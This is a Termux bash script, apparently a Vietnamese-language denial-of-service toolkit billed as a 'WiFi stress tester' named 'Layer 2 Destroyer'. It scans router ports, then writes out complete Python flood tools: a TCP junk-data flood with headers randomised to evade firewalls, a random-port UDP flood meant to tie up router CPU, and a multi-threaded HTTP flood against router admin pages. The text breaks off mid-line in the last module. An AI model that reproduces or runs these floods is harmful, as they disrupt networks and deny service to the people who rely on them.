#!/data/data/com.termux/files/usr/bin/bash

# ============================================================
# ██╗  ██╗███████╗ ███████╗    ██╗  ██╗██╗   ██╗██╗███╗   ██╗
# ██║ ██╔╝██╔════╝ ██╔════╝    ██║  ██║██║   ██║██║████╗  ██║
# █████╔╝ █████╗   ███████╗    ███████║██║   ██║██║██╔██╗ ██║
# ██╔═██╗ ██╔══╝   ╚════██║    ██╔══██║██║   ██║██║██║╚██╗██║
# ██║  ██╗███████╗ ███████║    ██║  ██║╚██████╔╝██║██║ ╚████║
# ╚═╝  ╚═╝╚══════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
# ============================================================
#                LAYER 2 DESTROYER - MINH KHANG EDITION
# ============================================================

# ================ CONFIGURATION ================
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
ORANGE='\033[38;5;208m'
MAGENTA='\033[38;5;165m'
BG_BLACK='\033[48;5;0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
NC='\033[0m'

# Global variables
TARGET_IP=""
TARGET_MAC=""
GATEWAY_IP=""
INTERFACE=""
LOG_FILE="/data/data/com.termux/files/home/khang_attack.log"
ATTACK_PID=""

# ================ ANIMATED BANNER ================
show_banner() {
    clear
    echo -e "${RED}"
    echo '╔══════════════════════════════════════════════════════════════════════════════════╗'
    echo '║                                                                                  ║'
    echo '║  ██╗  ██╗ ██████╗ ███████╗    ██╗  ██╗██╗   ██╗██╗███╗   ██╗ ██████╗  ██╗  ██╗  ║'
    echo '║  ██║ ██╔╝██╔════╝ ██╔════╝    ██║  ██║██║   ██║██║████╗  ██║██╔════╝  ██║  ██║  ║'
    echo '║  █████╔╝ ██║  ███╗█████╗      ███████║██║   ██║██║██╔██╗ ██║██║  ███╗ ███████║  ║'
    echo '║  ██╔═██╗ ██║   ██║██╔══╝      ██╔══██║██║   ██║██║██║╚██╗██║██║   ██║ ██╔══██║  ║'
    echo '║  ██║  ██╗╚██████╔╝███████╗    ██║  ██║╚██████╔╝██║██║ ╚████║╚██████╔╝ ██║  ██║  ║'
    echo '║  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═╝  ╚═╝  ║'
    echo '║                                                                                  ║'
    echo '╠══════════════════════════════════════════════════════════════════════════════════╣'
    echo '║  ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██████╗ ██╗   ██╗██╗   ║'
    echo '║  ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║   ██╔══██╗██║   ██║██║   ║'
    echo '║  ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║██║   ██║  ██║██║   ██║██║   ║'
    echo '║  ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║██║   ██║  ██║██║   ██║██║   ║'
    echo '║  ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝█████╗██████╔╝╚██████╔╝██║   ║'
    echo '║  ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚════╝╚═════╝  ╚═════╝ ╚═╝   ║'
    echo '║                                                                                  ║'
    echo '╠══════════════════════════════════════════════════════════════════════════════════╣'
    echo '║  ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗    ║'
    echo '║  ║ L ║║ A ║║ Y ║║ E ║║ R ║║    ║ 2  ║║   ║║ D ║║ E ║║ S ║║ T ║║ R ║║ O ║║ Y ║    ║'
    echo '║  ╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝    ║'
    echo '║                                                                                  ║'
    echo '╚══════════════════════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                     🚀 WIFI STRESS TESTER - MINH KHANG EDITION 🚀                 ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ================ LOADING ANIMATION ================
loading_animation() {
    local text="$1"
    echo -ne "${YELLOW}[*] ${text} ${NC}"
    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
    for i in {1..10}; do
        echo -ne "\b${spin:$((i % 8)):1}"
        sleep 0.1
    done
    echo -e "\b${GREEN}✓${NC}"
}

# ================ INITIALIZE SYSTEM ================
initialize_system() {
    show_banner
    echo -e "${CYAN}[*] Khởi tạo hệ thống...${NC}"
    
    # Check and install dependencies
    local packages=("python" "nmap" "curl" "wget" "git" "nano")
    for pkg in "${packages[@]}"; do
        if ! command -v $pkg &> /dev/null; then
            loading_animation "Cài đặt $pkg"
            pkg install $pkg -y > /dev/null 2>&1
        fi
    done
    
    # Install Python packages
    loading_animation "Cài đặt Python packages"
    pip install --upgrade pip > /dev/null 2>&1
    pip install scapy colorama psutil requests > /dev/null 2>&1
    
    # Create log file
    touch $LOG_FILE
    echo -e "${GREEN}[✓] Hệ thống đã sẵn sàng!${NC}"
    sleep 1
}

# ================ PORT SCANNER ================
port_scanner() {
    echo -e "${PURPLE}[=== PORT SCANNER - Tìm điểm yếu ===]${NC}"
    read -p "Target IP: " TARGET_IP
    
    loading_animation "Đang quét cổng mở"
    
    # Common router ports
    local ports=(80 443 22 23 53 21 8080 7547 8291 161 162)
    local open_ports=()
    
    for port in "${ports[@]}"; do
        timeout 1 bash -c "echo > /dev/tcp/$TARGET_IP/$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            open_ports+=("$port")
            case $port in
                80) echo -e "${GREEN}  ✓ HTTP (80) - Web Interface${NC}" ;;
                443) echo -e "${GREEN}  ✓ HTTPS (443) - Secure Web${NC}" ;;
                22) echo -e "${GREEN}  ✓ SSH (22) - Remote Access${NC}" ;;
                53) echo -e "${GREEN}  ✓ DNS (53) - UDP/TCP${NC}" ;;
                8291) echo -e "${GREEN}  ✓ Mikrotik Winbox (8291)${NC}" ;;
            esac
        fi
    done
    
    if [ ${#open_ports[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] Không tìm thấy cổng mở, sử dụng cổng mặc định${NC}"
        open_ports=(80 443 53)
    fi
    
    echo "${open_ports[@]}" > /tmp/open_ports.txt
    echo -e "${CYAN}[✓] Tìm thấy ${#open_ports[@]} cổng mở${NC}"
}

# ================ SOCKET STREAM FLOOD ================
socket_stream_flood() {
    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/socket_flood.py
#!/usr/bin/env python3
import socket
import threading
import random
import os
import time
import sys

class SocketStreamFlood:
    def __init__(self, target_ip, target_ports=[80, 443, 22, 53]):
        self.target_ip = target_ip
        self.target_ports = target_ports
        self.running = True
        self.sent_count = 0
        
    def generate_junk_data(self, size=1024):
        """Tạo dữ liệu rác - Random bytes"""
        return os.urandom(size)
    
    def get_random_headers(self):
        """Tạo headers ngẫu nhiên để vượt firewall"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'curl/7.68.0',
            'PostmanRuntime/7.26.8'
        ]
        
        headers = [
            f"User-Agent: {random.choice(user_agents)}",
            f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.8'])}",
            f"Accept: {random.choice(['text/html', 'application/json', '*/*'])}",
            f"Connection: {random.choice(['keep-alive', 'close', 'upgrade'])}",
            f"Cache-Control: {random.choice(['no-cache', 'max-age=0'])}",
            f"Referer: http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}/"
        ]
        
        random.shuffle(headers)
        return headers
    
    def tcp_flood_worker(self, worker_id):
        """Worker thread cho TCP flood"""
        while self.running:
            try:
                target_port = random.choice(self.target_ports)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Kết nối
                sock.connect((self.target_ip, target_port))
                
                # Gửi headers + junk data
                if target_port in [80, 443, 8080]:
                    # HTTP/S port - gửi request giả
                    request = f"GET /{random.randint(1000,9999)} HTTP/1.1\r\n"
                    for header in self.get_random_headers():
                        request += f"{header}\r\n"
                    request += "\r\n"
                    sock.send(request.encode())
                
                # Gửi junk data
                for _ in range(random.randint(1, 10)):
                    if not self.running:
                        break
                    junk = self.generate_junk_data(random.randint(512, 2048))
                    sock.send(junk)
                    self.sent_count += 1
                    
                    if self.sent_count % 100 == 0:
                        print(f"\r[+] Packets sent: {self.sent_count}", end='')
                    
                    time.sleep(0.01)
                
                sock.close()
                
            except:
                pass
            
            time.sleep(0.05)
    
    def start_attack(self, threads=100, duration=60):
        """Bắt đầu tấn công"""
        print(f"[!] Bắt đầu Socket Stream Flood")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Ports: {self.target_ports}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Duration: {duration} seconds")
        print("[*] Đang tạo junk data và headers ngẫu nhiên...")
        
        # Khởi động worker threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=self.tcp_flood_worker, args=(i,))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        # Chạy trong khoảng thời gian
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                print(f"\r[🔄] Đang tấn công... {int(time.time() - start_time)}/{duration}s | Packets: {self.sent_count}", end='')
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n[!] Dừng tấn công...")
        
        self.running = False
        time.sleep(1)
        print(f"\n[✓] Hoàn thành! Tổng packets: {self.sent_count}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 socket_flood.py <target_ip> [threads] [duration]")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    # Đọc cổng mở từ file
    open_ports = []
    try:
        with open('/tmp/open_ports.txt', 'r') as f:
            open_ports = list(map(int, f.read().split()))
    except:
        open_ports = [80, 443, 22, 53]
    
    attacker = SocketStreamFlood(target, open_ports)
    attacker.start_attack(threads, duration)
PYTHON_EOF
    
    echo -e "${GREEN}[✓] Socket Stream Flood Module Ready!${NC}"
}

# ================ UDP BLACK HOLE ATTACK ================
udp_black_hole() {
    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/udp_blackhole.py
#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys

class UDPBlackHole:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.running = True
        self.sent_count = 0
        
    def send_udp_packet(self):
        """Gửi UDP packet vào port ngẫu nhiên"""
        try:
            # Tạo socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            
            # Port ngẫu nhiên (1-65535)
            target_port = random.randint(1, 65535)
            
            # Tạo payload ngẫu nhiên
            payload_size = random.choice([64, 128, 256, 512, 1024, 1500])
            payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
            
            # Gửi packet
            sock.sendto(payload, (self.target_ip, target_port))
            self.sent_count += 1
            
            # Đôi khi gửi packet bị hỏng
            if random.random() < 0.1:
                broken_packet = payload[:random.randint(1, len(payload)//2)]
                sock.sendto(broken_packet, (self.target_ip, target_port))
                self.sent_count += 1
            
            sock.close()
            return True
            
        except:
            return False
    
    def udp_flood_worker(self, worker_id):
        """Worker thread cho UDP flood"""
        packets_per_second = random.randint(50, 200)
        while self.running:
            for _ in range(packets_per_second):
                if not self.running:
                    break
                self.send_udp_packet()
            time.sleep(0.01)
    
    def start_attack(self, threads=50, duration=60):
        """Bắt đầu UDP Black Hole Attack"""
        print(f"[!] Bắt đầu UDP Black Hole Attack")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Duration: {duration} seconds")
        print("[*] Gửi UDP packets vào random ports...")
        print("[!] Router sẽ tốn CPU cho ICMP Destination Unreachable")
        
        # Khởi động worker threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=self.udp_flood_worker, args=(i,))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        # Chạy trong khoảng thời gian
        start_time = time.time()
        last_count = 0
        
        try:
            while time.time() - start_time < duration:
                current_time = time.time() - start_time
                
                # Tính packets per second
                if current_time > 1:
                    pps = self.sent_count - last_count
                    last_count = self.sent_count
                    
                    print(f"\r[🌀] {int(current_time)}/{duration}s | Packets: {self.sent_count} | PPS: {pps}", end='')
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[!] Dừng tấn công...")
        
        self.running = False
        time.sleep(1)
        print(f"\n[✓] Hoàn thành! Tổng UDP packets: {self.sent_count}")
        print("[!] Router đã tốn CPU xử lý ICMP responses")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 udp_blackhole.py <target_ip> [threads] [duration]")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    attacker = UDPBlackHole(target)
    attacker.start_attack(threads, duration)
PYTHON_EOF
    
    echo -e "${GREEN}[✓] UDP Black Hole Module Ready!${NC}"
}

# ================ MULTI-THREADED HTTP/S ATTACK ================
http_multithread_attack() {
    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/http_attack.py
#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor

class HTTPMultiThreadAttack:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = True
        self.request_count = 0
        self.active_connections = 0
        
        # Danh sách User-Agent đa dạng
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0',
            'curl/7.74.0',
            'PostmanRuntime/7.28.0'
        ]
        
        # Các đường dẫn giả cho router
        self.router_paths = [
            '/', '/admin', '/login', '/status', '/wireless',
            '/dhcp', '/nat', '/firewall', '/system', '/tools',
            '/wan', '/lan', '/wlan', '/advanced', '/management'
        ]
    
    def create_http_request(self):
        """Tạo HTTP request giả mạo"""
        method = random.choice(['GET', 'POST', 'HEAD'])
        path = random.choice(self.router_paths)
        user_agent = random.choice(self.user_agents)
        
        request = f"{method} {path} HTTP/1.1\r\n"
        request += f"Host: {self.target_ip}\r\n"
        request += f"User-Agent: {user_agent}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += f"Connection: {'keep-alive' if random.random() > 0.3 else 'close'}\r\n"
        
        # Thêm các headers ngẫu nhiên
        if random.random() > 0.5:
            request += f"Referer: http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}/\r\n"
        if random.random() > 0.7:
            request += "Cache-Control: no-cache\r\n"
        if random.random() > 0.8:
            request += "Cookie: session=" + ''.join(random.choices('abcdef0123456789', k=32)) + "\r\n"
        
        request += "\r\n"
        
        # Nếu là POST request, thêm data
        if method == 'POST':
            post_data = f"username={random.randint(1000,9999)}&password={random.randint(10000,99999)}"
            request += post_data
        
        return request.encode()
    
    def http_worker(self, worker_id):
        """Worker thread cho HTTP attack"""
        while self.running:
            try:
                # Tạo socket kết nối
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                # Kết nối đến target
                sock.connect((self.target_ip, self.target_port))
                self.active_connections += 1
                
                # Gửi nhiều request liên tục
                for _ in range(random.randint(1, 20)):
                    if not self.running:
                        break
                    
                    request = self.create_http_request()
                    sock.send(request)
                    self.request_count += 1
                    
                    # Đôi khi đọc response (tốn thêm CPU cho router)
                    if random.random() > 0.7:
                        try:
                            sock.recv(1024)
                        except:
                            pass
                    
                    # Random delay
                    time.sleep(random.uniform(0.01, 0.1))
                
                # Giữ kết nối mở một lúc (keep-alive)
                if random.random() > 0.5:
                    time.sleep(random.uniform(0.5, 2))
                
                sock.close()
                self.active_connections -= 1
                
            except Exception as e:
                if self.active_connections > 0:
                    self.active_connections -= 1
                time.sleep(0.1)
    
    def start_attack(self, max_workers=200, duration=60):
        """Bắt đầu HTTP Multi-Thread Attack"""
        print(f"[!] Bắt đầu Multi-Threaded HTTP/S Attack")
        print(f"[*] Target: {self.target_ip}:{self.target_port}")
        print(f"[*] Max Workers: {max_workers}")
        print(f"[*] Duration: {duration} seconds")
        pr
